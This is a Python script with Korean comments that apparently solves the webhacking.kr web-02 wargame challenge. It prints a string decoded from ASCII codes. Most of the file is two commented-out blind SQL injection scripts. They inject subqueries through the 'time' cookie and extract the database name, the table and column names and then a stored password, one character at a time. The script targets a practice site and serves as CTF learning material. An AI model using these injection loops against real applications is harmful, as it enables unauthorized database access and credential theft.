# Python Script

# ASCII CODE 문자로 추출

a = [107,117,100,111,115,95,116,111,95,98,101,111,116,108,97,98]
for i in a:
    print(chr(i), end ="")

# ASCII CODE 문자로 추출

# import requests

# url = 'https://webhacking.kr/challenge/web-02/'
# db = ''
# bye = 0

# for i in range(1,50):
#     if bye == 1:
#         break
#     for j in range(33,133): # ascii 코드표 참고
#         c = {"cookie":"PHPSESSID=fegrpl729j53avml7rsc02kbt5; time=0 or if(ord(substr((select database()),{},1))={},1,0)".format(i,j)}
        
#         res = requests.get(url, cookies=c)
#         #print("i : {}, j : {}".format(i, j))
#         if res.text.find("09:00:01") != -1:
#             db += chr(j)
#             print(db)
#             break
#             # 문자열을 찾지 못하면 -1을 반환한다.
#             # 참이면, 09:00:01로 1초를 반환하고 false일시 0초를 반환한다.
#         if j == 132:
#             # 마지막까지 갔다는 것은 db이름 끝까지 구해졌다는 의미이다.
#             bye=1
#             break
# print("database : {}".format(db))

# import requests

# # To calculate the value
# def calculate_time(response):
# 	value=0
# 	value+=60*int(response.text[20])
# 	value+=10*int(response.text[22])
# 	value+=int(response.text[23])
# 	return value

# url='https://webhacking.kr/challenge/web-02/'

# cookies={
# 	"PHPSESSID": "pcm49knla2uhjiv679qtc0rk92"
# }

# # To find length of table_name
# cookies['time']="(select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1)"
# response=requests.get(url, cookies=cookies)
# t_name_length=int(calculate_time(response))

# # To find table_name
# t_name=""
# for a in range(1, t_name_length+1):
# 	cookies['time']="(select ascii(substring(table_name, {}, 1)) from information_schema.tables where table_schema=database() limit 0, 1)".format(a)
# 	response=requests.get(url, cookies=cookies)
# 	t_name+=chr(calculate_time(response))

# print(t_name)

# # To find length of column_name
# cookies['time']="(select length(column_name) from information_schema.columns where table_name='{}')".format(t_name)
# response=requests.get(url, cookies=cookies)
# c_name_length=int(calculate_time(response))

# # To find column_name
# c_name=""
# for b in range(1, c_name_length+1):
# 	cookies['time']="(select ascii(substring(column_name, {}, 1)) from information_schema.columns where table_name='{}')".format(b, t_name)
# 	response=requests.get(url, cookies=cookies)
# 	c_name+=chr(calculate_time(response))
# print(c_name)

# # To find length of password
# cookies['time']="(select length({}) from {})".format(c_name, t_name)
# response=requests.get(url, cookies=cookies)
# pw_length=int(calculate_time(response))

# # To find password
# password=""
# for c in range(1, pw_length+1):
# 	cookies['time']="(select ascii(substring({}, {}, 1)) from {})".format(c_name, c, t_name)	
# 	response=requests.get(url, cookies=cookies)
# 	password+=chr(calculate_time(response))
# print(password)